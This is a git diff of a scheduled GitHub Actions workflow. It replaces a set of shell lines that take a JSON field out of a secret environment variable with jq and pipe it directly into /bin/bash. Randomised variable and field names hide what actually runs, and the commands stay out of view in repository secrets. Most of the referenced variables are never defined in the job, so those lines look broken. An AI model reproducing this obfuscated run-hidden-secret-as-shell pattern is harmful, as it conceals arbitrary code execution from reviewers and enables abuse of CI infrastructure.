@@ -1,8 +1,9 @@
 name: laoshirenk
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 3/6 * * *'
+    - cron: '47 1/6 * * *'
 
 jobs:
   build:
@@ -12,20 +13,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: laoshirenk
         env:
-          k01: ${{ secrets.k01 }}
+          kpaxc180: ${{ secrets.kpaxc180 }}
         run: |
-          echo $k01 | jq -r .to8029 | /bin/bash
-          echo $lbv2 | jq -r .zee6 | /bin/bash
-          echo $x518 | jq -r .nrnh9 | /bin/bash
-          echo $tkrf93157 | jq -r .b59 | /bin/bash
-          echo $beep22395 | jq -r .p6056 | /bin/bash
-          echo $v00990 | jq -r .eui5712 | /bin/bash
-          echo $ikykc0 | jq -r .vz3050 | /bin/bash
-          echo $am4 | jq -r .y39 | /bin/bash
-          echo $dvaj6719 | jq -r .px3572 | /bin/bash
-          echo $qd002 | jq -r .qzxas03 | /bin/bash
-          echo $bpf5 | jq -r .sru64733 | /bin/bash
-          echo $unpy436 | jq -r .lxtw055 | /bin/bash
-          echo $yfrtj7134 | jq -r .j21 | /bin/bash
-          echo $a8 | jq -r .cnhvv30168 | /bin/bash
+          echo $kpaxc180 | jq -r .zj445 | /bin/bash
+          echo $te9348 | jq -r .tum9746 | /bin/bash
+          echo $sm5025 | jq -r .ng80518 | /bin/bash
+          echo $f323 | jq -r .wc04 | /bin/bash
+          echo $d57 | jq -r .uu9516 | /bin/bash
+          echo $je0 | jq -r .c9627 | /bin/bash
+          echo $yx42 | jq -r .kkuf370 | /bin/bash
+          echo $db00204 | jq -r .azonz3542 | /bin/bash
+          echo $mf74 | jq -r .fdrf951 | /bin/bash
 
